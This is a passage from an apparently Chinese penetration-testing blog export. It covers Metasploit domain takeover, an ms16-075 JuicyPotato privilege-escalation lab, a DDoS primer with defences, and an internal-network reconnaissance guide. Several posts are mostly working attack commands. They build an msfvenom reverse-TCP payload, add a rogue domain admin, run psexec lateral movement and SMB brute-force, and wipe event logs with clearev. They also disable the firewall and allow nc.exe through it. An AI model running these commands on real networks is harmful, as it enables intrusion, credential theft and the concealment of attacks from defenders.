c:\\\nshell    # 进入到目标的shell，再执行\n\n```\n\n#### Powershell寻找域管在线服务器\n使用`PowerView`脚本的`Invoke-User Hunter`上传到目标机器，然后执行`Invoke-UserHunter`\n```bash\npowershell.exe -exec bypass -Command \"&{Import-Module .powerview.ps1;Invoke-UserHunter}\"\n```\n找到域管理员当前在线登录的主机后，入侵该主机，然后把它迁移到域管理员登录所在的进程，这样就有了域管的理的权限\n\n\n\n#### 获取域管权限\n渗透域控\n```bash\n# 先尝试\ngetsystem\ngetuid  #查看当前用户，因为之前知道这账户的域管理员\nps    # 找到域管理所在进程\nmigrate 30560 # 迁移进程过去(也可以用msf中窃取令牌的功能)\n# 查看主域控的IP\nshell    # 先进去cmd\nnet time\n# 使用IPC$入侵来返回一个域控的meterpreter shell(操作见上面的步骤)\nnet user test test123 /ad /domain # 添加域管理员\nnet group \"domain admins\" /domain  #查看域管理员是否添加成功\n```\n\n\n#### 登录域控\n下面要登录域控，抓取hash\n\n常见的登录域控的方法：\n```bash\n- 利用IPC上传AT&Achtasks远程执行命令\n- 利用端口转发或Socks登录DC的3389\n- 登录对方内网一台主机使用PsTools工具包中的PsExec来反弹shell\n- 使用msf下的PsExec，psexec_psh, Impacket psexec, pth-winexe, Empire Invoke-Psexec等PsExec类工具反弹shell\n- 使用msf下的smb_login反弹shell\n- 使用WMI来进行攻击\n- 使用PsRemoting posershel远程执行命令\n- 其他\n```\n最常见的是msf下的PsEcex反弹meterpreter(1.msf下的PsEcex模块   2.cuestom模块,建议使用Veil之类的工具来生成免杀的payload)\n```bash\nuse /exploit/windows/smb/psexec\nset smbuser test\nset smbpass test123\nset smbdomain HACKER\nset rhost 192.168.0.111\nrun\n# 获得反弹的meterpreter shell之后，先迁移进程，查看DC的系统系统和sesssion控制图\nps\nmigrate 2166\ngetuid\nsysinfo\nsessions    # 查看我们获取的sessions\n\n# 抓hash方法：\n- msf自带的hashdump(有system权限才可以)或smart_dump模块导出用户的Hash\n- 使用PowerShell的相应模块导出hash\n- 使用WCE、Mimikatz等工具\n- 其他\n```\n\n\n\n#### SMB爆破内网\n有了DC的密码，接下来只需快速在内网扩大控制权限\n\n- 利用当前获取的DC的账户密码，对整个域控的IP短进行扫描\n- 使用SMB下的smb_login模块\n- 端口转发或socks代理进内网\n\n```bash\n## 先在msf添加路由，然后使用smb_login模块Huo psexec_Scanner模块进行爆破\nbackground\nroute add 192.168.0.115 255.255.255.0  2    # 目的是访问1192.168.0.115将通过meterpreter的会话 2 来访问：\nsearch smb_login\nuse auxiliary/scanner/smb/smb_login\nset ...\nrun\n\n# 扫描内网\ncreds  # 然后获得大量内网服务器的密码，下面就可以畅游内网了\n\n# 可以使用Meterpreter的端口转发，也可以使用Metasploit下的Socks4a模块或第三方软件(这里使用简单的第一种)\nportfwd add -l 5555 -p 3389 -r 127.0.0.1\nbackground\n```\n\n\n#### 清理日志\n**步骤**\n- 删除之前添加的域管理员的帐号\n- 删除所有在渗透中使用的工具\n- 删除应用程序、系统和安全日志\n- 关闭所有的Meterpreter连接\n\n```bash\nnet user test /dels\nclearev    # 删除日志\nsessions\nsessions -K # 关闭所有msf连接\n```\n\n\n\n\n\n\n\n\n\n\n\n","tags":["Metasploit"],"categories":["渗透测试"]},{"title":"ms-16075提权Windows Server 2008","url":"%2Fposts%2F29481%2F","content":"\n>光看网上的文章是不够的，还是要多动手才行\n\n\n#### ms16-075漏洞简介\nWindows SMB 服务器特权提升漏洞（CVE漏洞编号：CVE-2016-3225）当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞，成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。\n漏洞详情，[请戳这里](https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2016/ms16-075)\n\n\n\n\n#### 开始动手\n1.假设是msfvenom生成木马，目标执行了，监听会话，获得meterpreter会话权限\n\n```bash\nmsfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.0.103 lport=4444 -f exe > shell.exe\n```\n\n2.先看一下当前权限(确保我没有作弊)\n![](http://image.xpshuai.cn/ms16075_download.png)\n\n3.查看系统信息，并导出\n```bash\n# (进入cmd)\nshell\nchcp   65001     # 将编码格式改为utf-8中文\nsysteminfo >> c:\\out.txt   将系统信息输出到out.txt文件\n```\n\n4.在meterpreter把结果文件下载到本地\n\n```bash\ndownload   D:\\\\xxxx\\\\upload\\\\out.txt   /tmp/out.txt    \n```\n![](http://image.xpshuai.cn/ms16075_download.png)\n\n\n\n5.这里选择`Windows-Exploit-Suggeste`提权辅助工具，对结果文件在本地进行分析, 查找系统未打补丁有哪些\n```\npython windows-exploit-suggester.py --update\npython windows-exploit-suggester.py -i out.txt -d 2020-05-09-mssb.xls -l  # -i是systeminfo的结果文件\n```\n![](http://image.xpshuai.cn/ms16075_poc.png)\n\n可以看到可能存在ms16-075漏洞\n![](http://image.xpshuai.cn/ms16075_in.png)\n\n\n6.开始验证\n```bash\n# 上传ms16-075的exp: JuicyPotato.exe至靶机\nupload /root/Desktop/JuicyPotato.exe  C:\\\\\n\nexecute -cH -f  C:\\\\JuicyPotato.exe    # 执行poc(前面已经把poc上传到目标了), 创建新的进程\nimpersonate_token \"NT AUTHORITY\\\\SYSTEM\"    # 窃取, 假冒目标主机上的可用令牌\n\n```\n![](http://image.xpshuai.cn/ms16075_in.png)\n\n7.查看当前权限，提取成功\n```bash\ngetuid                # 查看当前权限\n```\n![](http://image.xpshuai.cn/ms16075_ok.png)\n\n\n8.后面的事情，嘿嘿你懂得\n\n\n\n>这里只是没有防护的情况下的一次简单实验，有点简陋有点水\n\n\n\n","tags":["ms-16075"],"categories":["渗透测试"]},{"title":"python进程之间全局锁(GIL)","url":"%2Fposts%2F30441%2F","content":"  \n感觉这篇文章写的不错： [点击这里](http://blog.sina.com.cn/s/blog_176d630ea0102xufk.html)\n","tags":["GIL"],"categories":["Python"]},{"title":"DDoS入门学习","url":"%2Fposts%2F64661%2F","content":"\n>之前以为DDos很简单，现在发现学问还是大滴很呢！！！\n\n## 理论\n#### DDOS简介\nDDOS(Distributed Denial of Service)，又称分布式拒绝服务攻击。\n是指处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击。由于攻击的发出点是分布在不同地方的，这类攻击称为分布式拒绝服务攻击，其中的攻击者可以有多个。\n分布式拒绝服务攻击方式在进行攻击的时候，可以对源IP地址进行伪造，这样就使得这种攻击在发生的时候隐蔽性是非常好的，同时要对攻击进行检测也是非常困难的，因此这种攻击方式也成为了非常难以防范的攻击。\n\n\n#### DDOS危害\n出口带宽堵死\n游戏掉线导致客户流失\n服务器连接数多，连接资源被耗尽\n服务器卡、慢、死机、无法连接\n\n\n#### 流量特点\nIP地址随机或固定某些IP段随机\n没有完整完成三次握手\n地址多数是伪造的\n请求数量大、快\n\n\n\n\n\n#### DDOS攻击类型与防御\n###### 1.Smurf攻击\n攻击者向网关(网络广播地址)发送ICMP请求包，并将该ICMP请求报文的源地址伪造成受害主机IP地址，目的地址为广播地址。路由器在接受到该数据包，发现目的地址是广播地址，就会将该数据包广播出去，局域网内所有的存活主机都会受到一个ICMP请求包，源地址是受害主机IP。接下来受害主机就会收到该网络内所有主机发来的ICMP应答报文，通过大量返回的ICMP应答报文来淹没受害主机，最终导致网络阻塞，受害主机崩溃。下面是smurf攻击示意图（盗的图）\n![](http://image.xpshuai.cn/smurf%E6%94%BB%E5%87%BB.png)\n\n**防护方案：**\n- 禁止路由器广播ICMP请求包；\n- 禁止操作系统对广播发出的ICMP请求包做出响应；\n- 配置防火墙静止来自你所处网络外部的ping包\n\n\n\n###### 2.TearDrop攻击\n是一种畸形报文攻击，基于UDP的病态分片数据包的攻击方法。\n通过设置错误的片偏移(IP分段)，使得数据包到达目的地时，服务器无法重新组合数据包，因为数据包的组合是通过片偏移来组装的，最终导致崩溃。对比一下正常IP数据包和错误IP数据包\n这种攻击主要对旧的windows版本和Linux版本有效。\n\n**防护：**\n可以检测发来的数据包片偏移是否合法，如果合法在组装，不合法直接丢弃。比如这个：[分片重组检查算法](https://wenku.baidu.com/view/b45bba61ddccda38376baf7f.html)\n\n\n\n###### 3.Land Attack（着陆攻击）\n攻击者发动Land Attack攻击时，需要先发出一个SYN数据包，并将数据包的源IP与目的IP都设置成要攻击的目标IP，这样目标在接收到SYN数据包后，会根据源IP回应一个SYN+ACK数据包，即和自己建立一个空连接，然后到达idel超时时间时，才会释放这个连接。攻击者发送大量这样的数据包，从而耗尽目标的TCP连接池，最终导致拒绝服务。\n\nKali Linux提供的很多工具，都可以实现伪造包的功能，如`hping3`。\n\n**防御方案：**\n这种攻击对早期系统有效。通过防火墙、路由设备，建立规则，丢弃源地址和目标地址相同的SYN、SYN+ACK的TCP。\n\n\n###### 4.YN FLOOD攻击\nSYN FLOOD攻击是在TCP三次握手过程中产生的。\n攻击者通过发送大量伪造的带有SYN标志位的TCP报文，与目标主机建立了很多`虚假的半开连接`，在服务器返回SYN+ACK数据包后，攻击者不对其做出响应，也就是`不返回ACK数据包给服务器`，这样服务器就会一直等待直到超时。这种攻击方式会使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的\n![](http://image.xpshuai.cn/syn.png)\n\n\n**防御：**\n- SYNCheck：使用防护设备，3次握手变成了6次握手，由防护设备检测SYN请求是否合法，通过后再由防护设备将报文转发给服务器，后续报文仍由防护设备代理。\n- Micro blocks：管理员可以在内存中为每个SYN请求创建一个小索引(小于16字节)，而不必把整个连接对象存入内存。\n- RST cookies：在客户端发起第一个SYN请求后，服务器故意回应一个错误的SYN+ACK报文。如果合法用户收到这个报文，就会给服务器响应RST报文。当服务器收到这个报文时，就将这个主机的IP记录进合法IP列表，下次该主机发起SYN请求时，就可以直接通过了。\n- STACK tweaking：管理员可以调整TCP堆栈以减缓SYN泛洪攻击的影响。这包括减小超时时间，等到堆栈存释内放时再分配连接，否则就随机性地删除传入的连接。\n\n\n\n\n###### 5.ACK FLOOD攻击\nACK FLOOD攻击是利用TCP三次握手过程。这里可以分为两种。\n**第一种：**\n攻击者伪造大量的SYN+ACK包发送给目标主机，目标主机每收到一个SYN+ACK数据包时，都会去自己的TCP连接表中查看有没有与ACK的发送者建立连接 ，如果有则发送ACK包完成TCP连接，如果没有则发送ACK+RST 断开连接。但是在查询过程中会消耗一定的CUP计算资源。如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。\n\n**第二种：**\n利用TCP三次握手的ACK+SYN应答，攻击者向不同的服务器发送大量的SYN请求，这些`SYN请求数据包的源IP均为受害主机IP`，这样就会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。\n\n>通常DDOS攻击会将ACK flood与SYN flood`结合`在一起，从而扩大威力。\n\n**防御方案参考：**\n- 采用CDN进行流量稀释；\n- 避免服务器IP暴露在公网上；\n- 通过限速或动态指纹的方式；\n- 利用对称性判断来分析出是否有攻击存在；\n- 在连续收到用户发送的ACK包时，中断回话，让其重连。\n\n\n\n\n###### 6.UDP FLOOD攻击(UDP泛洪攻击)\n因为UDP不需要三次握手，这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。\nUDP FLOOD可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。\n大量**小数据包**会增大网络设备处理数据包的压力；\n而对于**大数据包**，网络设备需要进行分片、重组，最终达到的效果就是占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。\n\n**防御方案：**\n- 限制每秒钟接受到的流量(可能产生误判)；\n- 通过动态指纹学习(需要攻击发生一定时间)，将非法用户加入黑名单。\n\n\n\n###### 7.NTP放大攻击\nNTP(Network Time Protocol，网络时间协议)，是用来使计算机网络时间同步化的一种协议，使用UDP`123`端口进行通信。\n通常在NTP服务器上会有一些调试接口，而利用这些接口中的monlist请求，就可触发放大攻击。当主机向NTP服务器发送monlist查询请求时，NTP服务器会将与之进行时间同步的最后600个IP地址返回。所以攻击者只需要将源地址伪造为受害主机的IP，向NTP服务器发送一个monlist查询请求包，受害主机就会收到大量的UDP响应包。这种攻击在放大攻击里，危害相对较大。\n\n\n**这种攻击产生的原因：**\n- 请求与响应数据包不等价；\n- UDP协议的通信模糊性（无数据传输确认机制）；\n- 以及NTP服务器的无认证机制。\n\n**防御方案：**\n- 使用防 DDoS 设备进行清洗；\n- 加固并升级NTP服务器；\n- 在网络出口封禁 UDP 123 端口；\n- 通过网络层或者借助运营商实施 ACL 来防御；\n- 关闭现在 NTP 服务的 monlist 功能，在ntp.conf配置文件中增加disable monitor选项。\n\n\n\n###### 8.DNS放大攻击\nDNS报文格式(借个图)：\n![](http://image.xpshuai.cn/DNS%E6%8A%A5%E6%96%87.png)\n\n首先，攻击者向僵尸网络发出指令，使僵尸网络中的每一台主机均发出一个伪造源地址的DNS查询请求包，这些请求包查询类型设置为ANY，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。\n接着查询类型设为递归查询，为什么不是迭代查询呢，仔细看两种查询的过程图可发现，如果迭代查询第一个请求的DNS服务器没有查询到结果，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的；而递归查询却是在查询到结果之后，才返回给查询请求发起者。\n利用这两个特点，攻击者就可以成功发起DNS放大攻击。这种普通的查询请求可以将攻击流量放大2~10倍，如果想增大攻击倍数，可以使用RFC 2671中定义的DNS拓展机制EDNS0。未使用EDNS0时，若响应包大小小于512字节，就使用UDP封装数据；若响应包大小超过512字节，就使用TCP连接或者服务器截断响应报文，丢弃超过512字节的部分，并把TC位置1。这两种方式都不利于进行DNS放大攻击。然而在开启EDNS0机制后，增加了OPT RR字段，这两个字段包含了能够处理的最大UDP报文大小信息，所以攻击者将这个信息设置的很大，服务器就会根据这个信息生成响应报文。最后看一下DNS放大攻击演示图\n![](http://image.xpshuai.cn/DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.png)\n\n```bash\n# 四个步骤\n1.攻击者使用受损端点将带有欺骗性IP地址的UDP数据包发送到DNS recursor(递归)。数据包上的欺骗地址指向受害者的真实IP地址。\n2.每个UDP数据包都向DNS解析器发出请求，通常会传递诸如“ANY”之类的参数，以便接收可能的最大响应。\n3.在收到请求后，尝试通过响应提供帮助的DNS解析器会向欺骗的IP地址发送大量响应。\n4.目标的IP地址接收响应，周围的网络基础设施因流量泛滥而变得不堪重负，导致拒绝服务。\n\n虽然一些请求不足以取消网络基础设施，但当此序列在多个请求和DNS解析器之间成倍增加时，目标接收的数据放大可能很大。\n```\n\n\n**防御的话，可以参考以下几点：**\n- 联系ISP清洗上游流量；\n- DNS服务器只对可信域内提供服务，限制对域外用户提供DNS解析服务；\n- 对单个IP的查询速率做限制；\n- 拥有足够的带宽承受小规模攻击；\n- 关闭DNS服务器的递归查询；\n- 利用防火墙等对ANY Request进行过滤。\n- 源IP验证 - 停止欺骗数据包离开网络\n\n\n\n\n\n###### 9.SNMP放大攻击\nSNMP(Simple Network Management Protocol，简单网络管理协议)，它使用UDP `161`端口进行通信\n攻击者向互联网上开启SNMP服务的设备发送GetBulk请求，并使用默认通信字符串作为认证凭据。常见的默认通信字符串如public、private以及一些厂商默认的通信字符串。GetBulk请求是在SNMPv2中添加的的，该请求会让SNMP设备尽可能多的返回数据，这也就是SNMP放大攻击的利用点\n\n攻击者先将源地址改成要攻击的目标IP，再使用默认的通信字符串，向大量SNMP设备发出GetBulk请求，设备收到GetBulk请求数据包后，会将一大段的设备检索信息返回给目标主机，最终目标主机会被这些SNMP设备返回的数据包淹没，导致拒绝服务。\n\n\n**防御措施：**\n- 禁止已开启SNMP的设备响应GetBulk请求，避免自己的设备被黑客利用；\n- 更改默认的通信字符串；\n- 修改默认端口161；\n- 隐藏开启SNMP设备的公网IP\n\n\n\n\n###### 10.TFTP放大攻击\nTFTP（Trivial File Transfer Protocol，简单文件传输协议），使用UDP `69`端口进行通信。\n由于TFTP使用的是不可靠的UDP协议，所以他不能确保发送的任何报文都能真正到达目的地，因此他必须使用定时器来检测并重传报文\n\nFTP协议将数据分成好多个数据块进行传输，每个数据块最大为512字节，客户端在接受到数据块时，需要给服务器端返回一个ACK确认报文，然后才会继续传输下一个报文。\n`若服务器没有收到客户端发来ACK报文`，则在时间到达超时计数器时，便会开启重传机制，这也就是攻击利用点。\n攻击者利用TFTP协议上的缺陷，伪造源地址向服务器发起请求，服务器回复的第1个data数据包后无法收到客户端发送的ACK。此时TFTP就会利用他的重传机制，定时重传第1个data数据包，当攻击者发出大量的这种请求时，TFTP放大攻击也就发生了\n\n\n**防御方案可参考如下：**\n- 不要将TFTP服务器暴露在公网上；\n- 对流经TFTP服务的流量进行入侵检测；\n- 将重传（数据包）率设置为1；\n- 只为信任域内的主机提供服务。\n\n\n\n\n###### 11.CC攻击\nCC攻击（ChallengeCollapsar）又称作HTTP 泛洪攻击。\n原理是攻击者控制肉鸡、僵尸网络或使用代理服务器，不停地向目标的web服务发送大量合法请求，使得正常用户的web请求处理缓慢甚至得不到处理，制造大量的后台数据库查询动作，消耗目标CPU资源，最终导致服务器宕机崩溃。\n这种攻击方式不需要很大的带宽，且`无法使用伪造IP地址进行攻击，需要真实的机器与web服务器建立连接`，因为HTTP协议是建立在TCP协议上，必须先进行TCP三次握手才能进行HTTP通信。\n如果目标web服务器支持HTTPS，那么发起的HTTPS泛洪攻击还能穿透一些防护设备。\n\nddos攻击和cc攻击区别知主要是针对对象的不同：\nddos是主要针对IP的攻击，而`CC攻击的主要是网页`。CC攻击相对来说，攻击的危害不是毁灭性的，但是持续时间长;而ddos攻击就是流量攻击，这种攻击的危害性较大，通过向目标服务器发送大量数据包，道耗尽其带宽，更难防御。\n\n\n**防御方案：**\n- 必要时将网页做成静态，减少数据库的使用；\n- 通过缓存的方式进行，尽量由设备的缓存直接返回结果来保护后端业务\n- Token随IP地址变化\n- 限制连接数量；\n- 修改最大超时时间；\n- 让用户手动输入验证码；\n- 在response报文中添加特殊字段，验证IP合法性；\n- 屏蔽频繁访问服务器的主机IP。\n\n一个防CC攻击的脚本：https://zhangge.net/4649.html\n\n参考文章：https://www.jianshu.com/p/dff5a0d537d8\n\n\n\n###### 12.HTTP慢速攻击\nSlow HTTP Dos AttACKs（慢速HTTP拒绝服务攻击）\n黑客模拟正常用户向web服务器发送慢速http请求，由于是慢速的，服务器端需要保持连接资源，直到数据传输结束或请求结束才可释放连接。当服务器端建立了大量这样的慢速连接，就会导致服务器拒绝服务。\n这种攻击可以分为两类：一类是客户端发数据，另一类是客户端读取服务器发来的数据。\nHTTP慢速攻击对基于线程处理的web服务器影响显著，如apache、dhttpd，而对基于事件处理的web服务器影响不大，如nginx、lighttpd。\n\n**HTTP慢速攻击还可以细分成以下几种攻击方式：**\na. Slowloris攻击方式\n```bash\nHTTP协议规定请求头以一个空行结束，所以完整的http请求头结尾是\\r\\n\\r\\n。\n然而'使用非正常的\\r\\n来结尾'，就会导致服务端认为我们的请求头还没结束，等待我们继续发送数据直到超时时间。\n# CRLF（Carriage Return Line Feed）表示回车换行\n```\n\n\nb. Slow post攻击方式\n```bash\n在http头部信息，可以使用content-length声明HTTP消息实体的传输长度，服务器端会content-length的值作为HTTP BODY的长度。\n利用这一特点，攻击者'把content-length设置得很大的，然后缓慢发送数据部分'，比如一次只发送一个字节，这样服务器端就要一直保持连接，直到客户端传完所有的数据。\n\n# 利用工具  slowloris\nhttps://github.com/gkbrk/slowloris.git\n参考文章：https://www.fujieace.com/hacker/tools/slowloris-dos.html\n```\n\nc. Slow read攻击方式\n```bash\n攻击者发送一个完整的HTTP数据请求，之后服务器会给出响应，这时攻击者再'将自己的TCP窗口大小设置的很小'，服务器会根据客户的TCP窗口大小来传送数据。\n由于客户端的TCP窗口大小很小，服务器只能缓慢的传输数据给客户端。当建立大量的这种连接时，web应用的并发连接池将被耗尽，最终导致拒绝服务。\n```\n\nd. Apache range header攻击\n```bash\n# 这种攻击方式只针对apache\n当客户端传输大文件时会有range字段，表示将大文件分段，分成几个小段进行传输。\n例如攻击者将一个文件按照一个字节一段，分成好多段，这样就会造成传输数据缓慢，长时间占用连接，消耗服务器CPU和内存资源\n```\n\n**防御**\n这里至只看apache的防护策略(具体的需要实践)  \n```bash\n# 设置并使用以下模块\nmod_reqtimeout 模块  # 控制请求数据传输的超时时间及最小速率\nmod_qos 模块         # Apache的一个服务质量控制模块，用户可配置各种不同阈值\nmod_security模块     # 一个开源的WAF模块，有专门针对慢速攻击防护的规则\n```\n对于其他中间件：[参考文章](https://blog.qualys.com/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks)\n\n\n\n###### 13.XSS-DOS\n利用网站存在的存储型XXS漏洞，在网站中插入恶意的javascript代码。\n代码的功能是不断向web服务器发起大量请求，从而导致服务器宕机，无法响应正常用户的请求\n\n\n由于这种攻击的是由存储型XSS导致的，我们再防御方面就要考虑如何防御存储型XSS。\n**防御策略如下：**\n- 对用户的输入以及url参数进行特殊字符过滤；\n- 对输出内容进行编码转换；\n- 结合黑白名单机制;\n- 等防御存储型XSS的方式\n\n\n\n\n\n###### 14.时间透镜攻击\n通过控制相同源和相同目的IP报文，使得走不同路径的数据包，在同一时刻到达目标服务器，从而达到流量集中攻击的目的。\n\n\n**防御方案：**\n- 增加抖动，干扰攻击路径，使得数据包无法预期到达；\n- 由运营商禁止源路由。\n- 采用高性能的网络设备；\n- 充足的网络带宽保证；\n- 升级主机服务器硬件；\n- 避免将服务器的真实IP暴露在公网中；\n- 使用CDN对流量进行稀释，当大流量稀释到各个CDN节点时，再对流量进行清洗，从而达到防护源站的目的（然而这种防御方式只能用在对域名发起的DDOS攻击，如果攻击者直接对IP进行攻击，则需要使用anycast技术来防御）。\n\n\n**可以参考：**\nhttp://icir.org/vern/papers/lensing.oak15.pdf\nhttp://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=7163026\nhttps://www.cnblogs.com/h2zZhou/p/6513238.html\nhttps://www.youtube.com/watch?v=QwAHNnKDVxQ\nhttps://mp.weixin.qq.com/s?__biz=MzI2NjUwNjU4OA==&amp;mid=2247483685&amp;idx=1&amp;sn=8ac38ff22d571bbbf7716cb9e83b9b35&amp;chksm=ea8c5916ddfbd00008d9b28e22fccba8c201ce78c70c2d78d10ee732f22a39ccf46d4b197634&amp;mpshare=1&amp;scene=23&amp;srcid=0831Wr5YJPYzSrQU6gnfGVd0\n\n\n\n\n>所有这些方案都不完美各有利弊，最终的策略可能是几种方案的结合使用，形成防御体系，将攻击提前化解在局部，不至于影响整个系统。\n\n------\n\n## 实践\n暂时有待实践\n\n\n\n\n\n\n\n**参考(基本是完全参考大佬的，整理的太全了)：**\nhttps://xz.aliyun.com/t/71\nhttps://xz.aliyun.com/t/70\n\n**其他链接资源：**\nhttps://www.freebuf.com/articles/network/76021.html\nhttps://www.cnblogs.com/wuyuan2011woaini/p/5800062.html\nhttps://www.cnblogs.com/micr067/p/12519779.html\nhttps://yq.aliyun.com/articles/480125/      kali下的DDos测试工具\n\n\n\n\n","tags":["DDos"],"categories":["渗透测试"]},{"title":"内网第二章-内网基础信息搜集","url":"%2Fposts%2F54461%2F","content":"\n\n# 二 . 内网信息收集\n\n#### <font color=red> 本机信息收集 </font>\n**1)查询网络配置**\n```\nnet view    # 查看工作组\n\nipconfig /all   # 也可以看到是否有域\n```\n\n**2) 查询用户列表**\n```\nnet user   # 查看本机用户列表\nnet localgroup administrators   # 本机管理员（通常含有域用户）\nquery user || qwinsta   # 查看当前在线用户（提前看看管理员是否在线）\n\n# 企事业单位的用户名有规则性\n\n```\n**3)查询进程列表**\n```\n# 看装了什么软件,vpn,杀毒软件,虚拟机,某服务(推敲域内是否都装了这个软件)\n# 看进程运行的权限\n\ntasklist /v\n# 或用wmic\nwmic process list brief\n```\n\n**4) 查看本机服务信息**\n```bash\nwmic service list brief\n```\n\n\n**5) 查询操作系统及安装软件版本信息**\n```\n# 获取操作系统和版本信息()\nsysteminfo |findstr /B /C:\"OS Name\" /C:\"OS Version\"   # 英文版本的话是这样\nsysteminfo |findstr /B /C:\"OS 名称\" /C:\"OS 版本\"       # 中文版本的话是这样\n\n\n# 查看系统体系结构\necho  %PROCESSOR_ARCHITECTURE%  # amd64\n\n# 查看安装软件和版本、路径等\nwmic product get name,version\n# powershell查看安装软件信息\npowershell \"Get-WmiObject -class Win32_Product |Select-Object -Property name,version\"\n```\n\n**6) 查询端口列表**\n```\nnetstat -ano\n\n# 根据端口综合判断，如果是内容用来更新的服务器/DNS服务器/代理服务器\n```\n\n**7) 查询启动信息**\n```bash\nwmic startup get command,caption\n```\n\n**8) 查看计划任务**\n```bash\nschtasks /query /fo LIST /v\n```\n\n**9) 查看主机开机时间**\n```bash\nnet statistics workstation\n```\n\n**10) 列出或断开本地计算机与所连接的客户端之间的会话**\n```bash\nnet session\n```\n\n**11) 查询补丁信息**\n```\nsysteminfo   #可以看到很多信息(域内主机补丁是批量打的)\n\n# 或用wmic\nwmic qfe get Caption,Description,HostFixID,InstalledOn\n```\n\n**12) 查询本机共享**\n```\n# 默认是开着C，IPC，ADMINS\n# 不单单是看本机的信息(通过本机判断域内情况)\nnet share\n\nnet share \\\\yourHostname\n\nwmic share get name,path,status\n\n# wmic： 是windows自带的一个命令工具，有很多功能(交互/非交互模式)\n```\n\n**13) 查询路由表和所有可用的ARP缓存表**\n```bash\nroute print\n\n#\narp -a\n```\n\n\n**14) 查询防火墙配置**\n```bash\n# '查看'防火墙配置\nnetsh firewall show config\n\n\n## '关闭'防火墙(msf里面也有)\n#1.对win server 2003以及之前的版本\nnetsh firewall set opmode disable\n#2.win server 2003之后的版本\nnetsh advfirewall set allprofiles state off \n\n\n# 自定义防火墙日志储存位置\nnetsh advfirewall set currentprofile logging filename \"C:\\windows\\temp/fw.log\"\n\n## '修改'防火墙相关配置(比关闭防火墙动静小，改完记得恢复规则)\n#1.对win server 2003以及之前的版本,允许指定程序全部连接\nnetsh firewall add allowprogram c:\\nc.exe \"allow nc\" enable\n\n#2.win server 2003之后的版本\n允许指定程序连入\nnetsh advfirewall firewall add rule name=\"pass nc\" dir=in action=allow program=\"C: \\nc.exe\"\n允许指定程序连出\nnetsh advfirewall firewall add rule name=\"Allow nc\" dir=out action=allow program=\"C: \\nc.exe\"\n允许3389端口放行\nnetsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389  action=allow \n```\n\n\n**15) 查看代理配置情况**\n```bash\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"\n\n```\n\n\n**16) 查询并开启远程连接服务（比较老的知识点）**\n```\n##### 查看远程连接端口\nReg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber\n\n\n###### 开启的3389方法：\n# 1.通用 开3389(优化后)：\n  wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1\n  \n# 2.For Win2003:\n  REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n  # 或者\n  wimc path win32_terminalservicesetting where (__CLASS !=\"\") call setallowsconnections 1\n  \n# 3.For Win2008:\n  REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n  \n# 4.For Every:\n  cmd开3389 win08 win03 win7 win2012 winxp\n  # win08，三条命令；win2012通用；win7前两条即可(权限需要run as administrator):\n  wmic /namespace:\\root\\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != \"\") call setallowtsconnections 1\n  wmic /namespace:\\root\\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1\n  reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n```\n\n\n**17) 自动化信息搜集**\n- 写一个脚本，把上面要搜集的信息都进行\n- WMIC(win管理工具命令行)的搜集信息的写好的脚本(执行该脚本后，会自动生成一个html文件) [链接](http://www.fuzzysecurity.com/scripts/files/wmic_info.rar)\n\n\n**18) Empire下的主机信息搜集**\n1.Empire提供了用于收集主机信息的模块，输入命令`usemodoule situational_awareness/host/winenum`即可看到一些信息\n2.`usemodoule situational_awareness/host/computerdetails` 包含了几乎所有有用的东西(但是运行这个模块需要管理员权限)\n\n\n\n#### <font color=red> 查询当前权限 </font>\n```bash\nwhoami    # 查询当前权限\n```\n**获取到一台主机的权限后，有如下三种情况：**\n- 本地普通用户\n- 本地管理员用户     （可以用来查询域内信息, 比如： `net view /xx/yy`）\n- 域内用户(域名\\用户)\n\n本地管理员权限默认和直接提升为Ntauthority或System权限，因此，在域中，除普通用户外，所有的机器都有一个机器用户(用户名是机器名+$)。本质上，机器的system用户对应的就是域里面的机器用户，所以使用system权限可以运行域内的查询命令  \n\n```bash\nwhoami /all    # 获取域SID  \nnet user xxx /domain  # 查询指定用户的详细信息\n```\n\n\n\n#### <font lor=red> 判断是否存在域 </font>\n如果存在域，就需要判断所控主机是否在域内  \n\n几种方法：\n```\n# 1.\nipconfig /all  # 可以查看网关IP地址、DNS的ip地址、域名、本机是否和dns处在同一网段\n# 然后，可以通过nslookup反解析域名的ip地址，用解析得到的ip地址进行对比，判断DC和DNS是否在同一台服务器上\n\n\n# 